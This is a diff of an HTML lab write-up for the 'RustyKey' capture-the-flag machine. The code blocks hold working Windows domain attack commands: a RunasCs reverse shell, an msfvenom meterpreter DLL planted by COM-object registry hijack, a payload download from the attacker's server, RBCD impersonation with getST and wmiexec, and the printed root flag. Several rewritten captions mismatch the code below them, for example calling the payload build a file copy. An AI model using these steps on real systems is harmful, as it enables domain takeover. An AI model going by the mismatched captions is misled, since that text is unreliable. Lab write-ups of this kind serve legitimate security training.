-      <p>But as you can see below, I will have to find another way to log in as user ee.reed. I did some research and came across the following page, which uses the runas command. So I will try this by copying the runas.exe tool to the Windows server and executing the command there, setting up a listener from my own machine. https://arttoolkit.github.io/wadcoms/RunasCs/</p>
-      <p>First, I will need to create the exe file. You can do this by using the command below. You can find this in the file ‘compile_commands.txt’.</p>
+      <p>I upload <code>RunasCs</code> to execute commands as ee.reed. A reverse shell listener is set up.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\bb.morgan\Documents&gt; upload /home/kali/HTB/RustyKey/RunasCs/RunasCs.cs
 
 *Evil-WinRM* PS C:\Users\bb.morgan\Documents&gt; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs_net2.exe RunasCs.cs</code></pre></div>
-      <p>We will now upload this to our connection with the user bb.morgan, and the listener will start on our Linux machine. You will see that we get the connection as user ee.reed.</p>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\bb.morgan\Documents&gt; .\RunasCs_net2.exe ee.reed Hallo@123 Powershell.exe -r 10.10.16.49:4444
 [*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
 [*] Warning: The logon for user &#x27;ee.reed&#x27; is limited. Use the flag combination --bypass-uac and --logon-type &#x27;8&#x27; to obtain a more privileged token.
@@ -698,7 +401,7 @@ Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its a
 [+] Async process &#x27;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#x27; with pid 4936 created in background.
 
 ┌──(kali㉿kali)-[~/HTB/RustyKey/RunasCs]
-└─$ nc -lvnp 4444 
+└─$ nc -lvnp 4444                                                     
 listening on [any] 4444 ...
 connect to [10.10.16.49] from (UNKNOWN) [10.129.199.109] 51724
 Windows PowerShell 
@@ -708,53 +411,55 @@ PS C:\Windows\system32&gt; whoami
 whoami
 rustykey\ee.reed
 PS C:\Windows\system32&gt;</code></pre></div>
-      <p>By using the following command, you can search the registry for entries related to “zip,” such as related files, programs, or components related to ZIP files. I did this using chatgpt and searching the internet.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250702223643.png" alt="Pasted image 20250702223643.png" loading="lazy" /><span class="img-caption">Pasted image 20250702223643.png</span></div>
+      <h3 class="writeup-sub-title">COM Object DLL Hijack</h3>
+      <p>I search the registry for ZIP-related CLSID entries. If a COM object's DLL path can be hijacked, I can execute arbitrary code when the object is loaded. I create a malicious DLL and register it.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250702223643.png" alt="Registry search for ZIP CLSIDs" loading="lazy" /><span class="img-caption">Registry search for ZIP CLSIDs</span></div>
+      <p>I interact with the Windows Registry to either query for useful configuration data (stored credentials, installed software, COM object registrations) or to add malicious entries. The Registry is Windows' hierarchical database for system and application settings — it's a frequent target for both reconnaissance and persistence/privilege escalation techniques.</p>
       <div class="code-block"><pre><code>PS C:\&gt; reg query HKCR\CLSID /s /f &quot;zip&quot;
 reg query HKCR\CLSID /s /f &quot;zip&quot;
 
 HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}
- (Default) REG_SZ 7-Zip Shell Extension
+    (Default)    REG_SZ    7-Zip Shell Extension
 
 HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
- (Default) REG_SZ C:\Program Files\7-Zip\7-zip.dll
+    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll
 
 HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}
- (Default) REG_SZ Compressed (zipped) Folder SendTo Target
- FriendlyTypeName REG_EXPAND_SZ @%SystemRoot%\system32\zipfldr.dll,-10226
+    (Default)    REG_SZ    Compressed (zipped) Folder SendTo Target
+    FriendlyTypeName    REG_EXPAND_SZ    @%SystemRoot%\system32\zipfldr.dll,-10226
 
 HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\DefaultIcon
- (Default) REG_EXPAND_SZ %SystemRoot%\system32\zipfldr.dll
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
 
 HKEY_CLASSES_ROOT\CLSID\{888DCA60-FC0A-11CF-8F0F-00C04FD7D062}\InProcServer32
- (Default) REG_EXPAND_SZ %SystemRoot%\system32\zipfldr.dll
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
 
 HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}
- (Default) REG_SZ Compressed (zipped) Folder Context Menu
+    (Default)    REG_SZ    Compressed (zipped) Folder Context Menu
 
 HKEY_CLASSES_ROOT\CLSID\{b8cdcb65-b1bf-4b42-9428-1dfdb7ee92af}\InProcServer32
- (Default) REG_EXPAND_SZ %SystemRoot%\system32\zipfldr.dll
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
 
 HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}
- (Default) REG_SZ Compressed (zipped) Folder Right Drag Handler
+    (Default)    REG_SZ    Compressed (zipped) Folder Right Drag Handler
 
 HKEY_CLASSES_ROOT\CLSID\{BD472F60-27FA-11cf-B8B4-444553540000}\InProcServer32
- (Default) REG_EXPAND_SZ %SystemRoot%\system32\zipfldr.dll
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
 
 HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\DefaultIcon
- (Default) REG_EXPAND_SZ %SystemRoot%\system32\zipfldr.dll
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
 
 HKEY_CLASSES_ROOT\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\InProcServer32
- (Default) REG_EXPAND_SZ %SystemRoot%\system32\zipfldr.dll
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll
 
 HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}
- (Default) REG_SZ Compressed (zipped) Folder DropHandler
+    (Default)    REG_SZ    Compressed (zipped) Folder DropHandler
 
 HKEY_CLASSES_ROOT\CLSID\{ed9d80b9-d157-457b-9192-0e7280313bf0}\InProcServer32
- (Default) REG_EXPAND_SZ %SystemRoot%\system32\zipfldr.dll</code></pre></div>
-      <p>Now I am going to create a malicious rce dll file, which I will then place in the location shown above, inside a folder that you create yourself.</p>
+    (Default)    REG_EXPAND_SZ    %SystemRoot%\system32\zipfldr.dll</code></pre></div>
+      <p>The command output below reveals important information about the target system's configuration. I carefully examine the results for credentials, misconfigurations, version numbers, or any other details that could be leveraged for further exploitation.</p>
       <div class="code-block"><pre><code>HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{E88DCCE0-B7B3-11d1-A9F0-00AA0060FA31}\InProcServer32</code></pre></div>
-      <p>We are going to create a malicious file by executing the following command.</p>
+      <p>I copy the file to a working directory for further processing.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~]
 └─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.49 LPORT=4444 -f dll -o rce.dll
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -763,33 +468,14 @@ No encoder specified, outputting raw payload
 Payload size: 510 bytes
 Final size of dll file: 9216 bytes
 Saved as: rce.dll</code></pre></div>
-      <p>Upload file to Win Connection. Before you can upload the file to the Windows server, you will first need to create the tmp folder. Otherwise, the code will say that the path is incorrect because there is no tmp folder on the C drive. You can create the folder on the C drive by simply executing the following command.</p>
+      <p>I create a temporary directory to stage files needed for the exploitation. Having a dedicated working directory on the target ensures tools and payloads are organized and don't conflict with system files.</p>
       <div class="code-block"><pre><code>PS C:\&gt; mkdir tmp</code></pre></div>
-      <div class="code-block"><pre><code>Kali machine
-
-──(kali㉿kali)-[~/HTB/RustyKey/RunasCs]
-└─$ python -m http.server 5555 
-Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...
-10.129.35.77 - - [04/Jul/2025 23:08:23] &quot;GET /test4.dll HTTP/1.1&quot; 200 -
-10.129.35.77 - - [04/Jul/2025 23:08:42] &quot;GET /test4.dll HTTP/1.1&quot; 200 -
-10.129.35.77 - - [04/Jul/2025 23:10:05] &quot;GET /test4.dll HTTP/1.1&quot; 200 -
-
-Win server
-PS C:\tmp&gt; Invoke-WebRequest -Uri &quot;http://10.10.16.49:5555/test4.dll&quot; -OutFile &quot;C:\tmp\test4.dll&quot;</code></pre></div>
-      <p>With this command, I add a registry entry under “HKLM\Software\Classes\CLSID{23170F69-40C1-278A-1000-000100020000}\InprocServer32”. I use the reg add command to set the default value of the ‘/ve’ parameter to the path “C:\tmp\rce.dll”, the ‘/d’ parameter, and the ‘/f’ option forces the change without confirmation.</p>
-      <div class="code-block"><pre><code>PS C:\tmp&gt; reg add &quot;HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&quot; /ve /d &quot;C:\tmp\rce.dll&quot; /f 
+      <p>I interact with the Windows Registry to either query for useful configuration data (stored credentials, installed software, COM object registrations) or to add malicious entries. The Registry is Windows' hierarchical database for system and application settings — it's a frequent target for both reconnaissance and persistence/privilege escalation techniques.</p>
+      <div class="code-block"><pre><code>PS C:\tmp&gt; reg add &quot;HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&quot; /ve /d &quot;C:\tmp\rce.dll&quot; /f  
 reg add &quot;HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32&quot; /ve /d &quot;C:\tmp\rce.dll&quot; /f
 The operation completed successfully.</code></pre></div>
-      <p>I tried to establish the connection using msfconsole. To connect the server and your Kali machine, you need to enter the same payload in msfconsole that you used in your msfvenom command to create the .dll file. Your next command will then look like this. But as you can see below, the connection is not established.</p>
-      <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey/RunasCs]
-└─$ msfconsole -q -x &quot;use multi/handler; set payload 
-[*] Using configured payload generic/shell_reverse_tcp
-payload =&gt; windows/x64/shell_reverse_tcp
-lhost =&gt; 10.10.16.49
-lport =&gt; 4444
-[*] Started reverse TCP handler on 10.10.16.49:4444</code></pre></div>
-      <p>I started looking for another solution, and after a lot of research, I decided that I could just use the netcat listener command to establish the connection. I then added the file to the registry.
-Now you can see that we have been able to establish a connection with the user mm.turner.</p>
+      <h3 class="writeup-sub-title">Getting a Shell as mm.turner</h3>
+      <p>After trying multiple approaches, a simple netcat listener proves most reliable for catching the callback.</p>
       <div class="code-block"><pre><code>nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.16.49] from (UNKNOWN) [10.129.35.77] 57699
@@ -799,30 +485,29 @@ Microsoft Windows [Version 10.0.17763.7434]
 C:\Windows&gt;whoami
 whoami
 rustykey\mm.turner</code></pre></div>
-      <p>Now we can see in Bloodhound what we can do with the user mm.turner. We can see that the user can impersonate dc.rustykey.htb. This means that if I follow the steps in Bloodhound below, the user will obtain backupadmin and thus be able to obtain the root file. For the steps below, I used the following two articles, which I used for troubleshooting.
-https://www.thehacker.recipes/ad/movement/dacl/
-https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250704155258.png" alt="Pasted image 20250704155258.png" loading="lazy" /><span class="img-caption">Pasted image 20250704155258.png</span></div>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250704155945.png" alt="Pasted image 20250704155945.png" loading="lazy" /><span class="img-caption">Pasted image 20250704155945.png</span></div>
-      <p>First, we will examine the properties of the DC computer.</p>
+      <h3 class="writeup-sub-title">RBCD to Domain Admin</h3>
+      <p>BloodHound shows <code>mm.turner</code> can impersonate <code>dc.rustykey.htb</code>. I set up <strong>Resource-Based Constrained Delegation</strong> — allowing the IT-COMPUTER3$ machine account to impersonate the backupadmin user to the DC.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250704155258.png" alt="RBCD delegation path in BloodHound" loading="lazy" /><span class="img-caption">RBCD delegation path in BloodHound</span></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250704155945.png" alt="Delegation permissions" loading="lazy" /><span class="img-caption">Delegation permissions</span></div>
+      <p>I inspect the AD computer object's delegation properties to understand the current RBCD configuration.</p>
       <div class="code-block"><pre><code>PS C:\Windows&gt; Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
 Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount
 
 
-DistinguishedName : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
-DNSHostName : dc.rustykey.htb
-Enabled : True
-Name : DC
-ObjectClass : computer
-ObjectGUID : dee94947-219e-4b13-9d41-543a4085431c
+DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
+DNSHostName                          : dc.rustykey.htb
+Enabled                              : True
+Name                                 : DC
+ObjectClass                          : computer
+ObjectGUID                           : dee94947-219e-4b13-9d41-543a4085431c
 PrincipalsAllowedToDelegateToAccount : {}
-SamAccountName : DC$
-SID : S-1-5-21-3316070415-896458127-4139322052-1000
-UserPrincipalName :</code></pre></div>
-      <p>I have set up resource-based constrained delegation on the Active Directory computer object DC. This allows the IT-COMPUTER3$ account to pass authentication tokens to this machine on behalf of other users.</p>
+SamAccountName                       : DC$
+SID                                  : S-1-5-21-3316070415-896458127-4139322052-1000
+UserPrincipalName                    :</code></pre></div>
+      <p>I configure the AD computer object for <strong>Resource-Based Constrained Delegation (RBCD)</strong>, allowing the specified machine account to impersonate users to this service.</p>
       <div class="code-block"><pre><code>PS C:\Windows&gt; Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount &quot;IT-COMPUTER3$&quot;
 Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount &quot;IT-COMPUTER3$&quot;</code></pre></div>
-      <p>After setting up the RBCD, I will generate a Service Ticket (TGS), which will allow me to obtain the .ccache file of the user backupadmin. The Domain Controller requests a ticket for the Service Principal Name (cifs/DC.rustykey.htb), allowing me to access SMB resources on the Domain Controller with the rights of backupadmin. https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd --&gt; (Second Knowledge article from above)</p>
+      <p>I generate a service ticket impersonating backupadmin, export it, and authenticate using <code>wmiexec.py</code>.</p>
       <div class="code-block"><pre><code>getST.py &#x27;RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!&#x27; -spn &#x27;cifs/DC.rustykey.htb&#x27; -impersonate backupadmin -dc-ip 10.129.35.77
 Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
 
@@ -832,9 +517,9 @@ Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its a
 [*] Requesting S4U2self
 [*] Requesting S4U2Proxy
 [*] Saving ticket in backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache</code></pre></div>
-      <p>This specifies which ccache file Kerberos should use for authentication.</p>
+      <p>I set the <code>KRB5CCNAME</code> environment variable to specify which Kerberos credential cache file to use for authentication in subsequent commands.</p>
       <div class="code-block"><pre><code>export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache</code></pre></div>
-      <p>To connect to the Windows server as user backupadmin, I started using wmiexec.py (WMI = Windows Management Instrumentation). You can use this to execute commands remotely on a Windows machine.</p>
+      <p>I use <strong>RunasCs</strong> to execute commands as a different user from within the current session, establishing a reverse shell under the target user's context.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey/RunasCs]
 └─$ wmiexec.py -k -no-pass &#x27;RUSTYKEY.HTB/backupadmin@dc.rustykey.htb&#x27;
 Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
@@ -844,29 +529,25 @@ Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its a
 [!] Press help for extra shell commands
 C:\&gt;whoami
 rustykey\backupadmin</code></pre></div>
-      <p>Now that we are the backupadmin user, we can retrieve the root flag. Navigate to the user administrator, then go to the desktop folder, where you will see the root.txt file.</p>
-      <div class="flag-box">
-  <span class="flag-label">🚩 Root Flag</span>
-  <code class="flag-value">7607f02fc0e4e723139a93f14e27dbf9</code>
-</div>
+      <h3 class="writeup-sub-title">Root Flag</h3>
       <div class="code-block"><pre><code>C:\Users\Administrator\Desktop&gt;dir
  Volume in drive C has no label.
  Volume Serial Number is 00BA-0DBE
 
  Directory of C:\Users\Administrator\Desktop
 
-06/24/2025 10:00 AM &lt;DIR&gt; .
-06/24/2025 10:00 AM &lt;DIR&gt; ..
-07/04/2025 12:45 PM 34 root.txt
- 1 File(s) 34 bytes
- 2 Dir(s) 2,950,602,752 bytes free
+06/24/2025  10:00 AM    &lt;DIR&gt;          .
+06/24/2025  10:00 AM    &lt;DIR&gt;          ..
+07/04/2025  12:45 PM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   2,950,602,752 bytes free
 
 C:\Users\Administrator\Desktop&gt;type root.txt
 7607f02fc0e4e723139a93f14e27dbf9</code></pre></div>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250704172232.png" alt="Pasted image 20250704172232.png" loading="lazy" /><span class="img-caption">Pasted image 20250704172232.png</span></div>
+      <div class="flag-box"><span class="flag-label">🚩 Root Flag</span><code class="flag-value">7607f02fc0e4e723139a93f14e27dbf9</code></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250704172232.png" alt="Machine rooted as backupadmin" loading="lazy" /><span class="img-caption">Machine rooted as backupadmin</span></div>
     </div>
   </div>
-
   <script type="text/javascript" src="/bundle.min.js"></script>
 </body>
 </html>
